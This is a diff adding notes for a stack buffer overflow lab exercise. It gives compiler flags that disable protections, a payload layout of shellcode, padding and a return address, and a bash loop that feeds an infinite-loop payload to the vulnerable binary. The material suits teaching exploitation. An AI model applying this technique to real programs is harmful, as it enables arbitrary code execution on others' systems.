@@ -1,1 +1,16 @@
-hello world !!
+Hint to compile the file.
+gcc -fno-stack-protector -z execstack -no-pie -ggdb -O0 -o ex5-stack-overflow-3 ex5-stack-overflow-3.c
+
+=============================
+Solution:
+ [ attcker code ][ buf============ bytes to fill================== ] + [ return address (8bytes 64bit) (4bytes 32bit) of the buf( targted variable )]
+
+ 1. attacker code : usually shelcode
+ 2. buf : fill the buf consideing the shelcode size
+ 3. returb address (check the address based arch ( size))
+	a. 8 bytes for the 64bit system
+	b. 4 bytes for the 32bit system
+
+example of running an " infinite loop ":
+
+for I in `seq 250 300` ; do (echo -ne '\xeb\xfe' ; dd if=/dev/zero count=1 bs=$I ; echo -ne '\x90\xe2\xff\xff\xff\x7f\x00\x00') > output.bin ; ./ex5-stack-overflow-3 < output.bin ; done;
